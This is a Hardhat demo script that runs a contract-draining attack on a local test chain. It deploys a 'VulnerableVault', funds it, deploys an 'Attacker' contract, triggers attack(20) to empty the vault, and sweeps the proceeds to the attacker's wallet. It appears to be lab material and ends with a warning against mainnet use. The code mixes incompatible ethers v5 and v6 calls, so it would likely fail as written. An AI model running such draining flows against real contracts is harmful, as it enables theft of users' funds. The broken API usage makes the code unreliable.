// scripts/one_shot_demo.js
// One-shot demo: deploy Vault, fund it, deploy Attacker (owner = attacker signer),
// run exploit locally, then collect funds with withdrawToOwner().
// Run with: npx hardhat run scripts/one_shot_demo.js
// Or against a running node: npx hardhat run scripts/one_shot_demo.js --network localhost

const { ethers } = require("hardhat");

async function main() {
  // Get three signers: deployer, attacker (will be owner of Attacker contract), user
  const [deployer, attackerSigner, user] = await ethers.getSigners();

  console.log("== Signers ==");
  console.log("Deployer:", deployer.address);
  console.log("Attacker (owner):", attackerSigner.address);
  console.log("User (funds vault):", user.address);
  console.log("");

  // Deploy VulnerableVault from deployer
  const VaultFactory = await ethers.getContractFactory("VulnerableVault", deployer);
  const vault = await VaultFactory.deploy();
  await vault.deployed();
  console.log("VulnerableVault deployed at:", vault.address);

  // User deposits 5 ETH into vault
  console.log("User depositing 5 ETH into the vault...");
  await vault.connect(user).deposit({ value: ethers.parseEther("5") });
  let vaultBal = await ethers.provider.getBalance(vault.address);
  console.log("Vault balance (after deposit):", ethers.formatEther(vaultBal), "ETH\n");

  // Deploy Attacker from attackerSigner (attackerSigner becomes owner)
  const AttackerFactory = await ethers.getContractFactory("Attacker", attackerSigner);
  const attacker = await AttackerFactory.deploy(vault.address);
  await attacker.deployed();
  const attackerOwner = await attacker.owner();
  console.log("Attacker contract deployed at:", attacker.address);
  console.log("Attacker owner (contract owner):", attackerOwner);
  console.log("");

  // Print balances helper
  async function printSummary(stage) {
    const vb = await ethers.provider.getBalance(vault.address);
    const ab = await ethers.provider.getBalance(attacker.address);
    const attackerEOABal = await ethers.provider.getBalance(attackerSigner.address);
    console.log(`== ${stage} ==`);
    console.log("Vault balance:", ethers.formatEther(vb), "ETH");
    console.log("Attacker contract balance:", ethers.formatEther(ab), "ETH");
    console.log("Attacker owner (EOA) balance:", ethers.formatEther(attackerEOABal), "ETH\n");
  }

  await printSummary("BEFORE ATTACK");

  // Run the attack: attacker.attack(20) with 1 ETH seed
  console.log("Running attack: attacker.attack(20) with 1 ETH seed...");
  const attackTx = await attacker.connect(attackerSigner).attack(20, { value: ethers.parseEther("1") });
  await attackTx.wait();
  console.log("Attack transaction mined.\n");

  await printSummary("AFTER ATTACK (before collect)");

  // Now collect funds from attacker contract to owner EOA
  console.log("Calling withdrawToOwner() to transfer attacker contract funds to owner EOA...");
  const collectTx = await attacker.connect(attackerSigner).withdrawToOwner();
  await collectTx.wait();
  console.log("withdrawToOwner() mined.\n");

  await printSummary("AFTER COLLECT");

  console.log("One-shot demo complete. All actions were performed on a local ephemeral Hardhat network.");
  console.log("Reminder: Do NOT run these scripts against mainnet or other people's contracts/wallets.");
}

main().catch((err) => {
  console.error("ERROR:", err);
  process.exitCode = 1;
});
  
